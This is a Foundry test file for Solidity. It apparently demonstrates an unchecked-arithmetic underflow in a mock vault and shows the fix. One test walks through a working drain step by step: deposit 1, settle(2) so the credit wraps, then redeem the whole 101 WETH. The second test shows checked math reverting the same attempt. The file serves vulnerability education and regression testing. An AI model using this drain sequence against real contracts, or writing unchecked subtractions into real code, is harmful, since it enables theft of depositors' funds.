// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import {MockWETH} from "../src/MockWETH.sol";
import {ClaimVaultBuggy} from "../src/ClaimVaultBuggy.sol";
import {ClaimVaultFixed} from "../src/ClaimVaultFixed.sol";

contract OverflowTest is Test {
    MockWETH weth;
    address attacker = makeAddr("attacker");
    function setUp() public { weth = new MockWETH(); }

    // OLD (unchecked): settle() subtracts inside `unchecked`, so fee > credit WRAPS to ~2^256.
    function test_drain() public {
        ClaimVaultBuggy vault = new ClaimVaultBuggy(address(weth));
        weth.mint(address(vault), 100 ether);        // 100 WETH from other users
        weth.mint(attacker, 1 ether);                // attacker's dust

        vm.startPrank(attacker);
        console.log("== Flooring: an unchecked underflow drains the vault ==");
        console.log("1. vault holds (others' WETH):", weth.balanceOf(address(vault))/1e18);
        vault.deposit(1 ether);
        console.log("2. attacker deposits 1 -> credit:", vault.credit(attacker)/1e18);
        vault.settle(2 ether);                       // 1 - 2 underflows inside unchecked
        console.log("3. settle(2): 1 - 2 UNDERFLOWS -> credit wraps to (x1e-18):");
        console.log("  ", vault.credit(attacker)/1e18);   // the cosmic number, on screen
        vault.redeem(101 ether);                     // redeem the WHOLE vault
        vm.stopPrank();

        console.log("4. redeem(101) -> attacker WETH:", weth.balanceOf(attacker)/1e18);
        console.log("5. vault drained -> WETH:", weth.balanceOf(address(vault))/1e18);
        assertEq(weth.balanceOf(address(vault)), 0);       // vault emptied
        assertEq(weth.balanceOf(attacker), 101 ether);     // attacker took everything
    }

    // FIXED: no `unchecked` -> Solidity 0.8 checked math reverts the underflow for free.
    function test_fixed() public {
        ClaimVaultFixed vault = new ClaimVaultFixed(address(weth));
        weth.mint(address(vault), 100 ether);
        weth.mint(attacker, 1 ether);

        vm.startPrank(attacker);
        vault.deposit(1 ether);
        console.log("== FIXED: checked 0.8 math reverts the underflow ==");
        console.log("1. attacker credit:", vault.credit(attacker)/1e18);
        vm.expectRevert();                           // arithmetic underflow -> revert
        vault.settle(2 ether);                        // fee 2 > credit 1 -> REVERTS, no wrap
        console.log("2. settle(2) REVERTED -> credit unchanged:", vault.credit(attacker)/1e18);
        vm.stopPrank();

        assertEq(weth.balanceOf(address(vault)), 101 ether); // vault safe (100 others + honest 1)
        assertEq(weth.balanceOf(attacker), 0);               // attacker stole nothing
    }
}
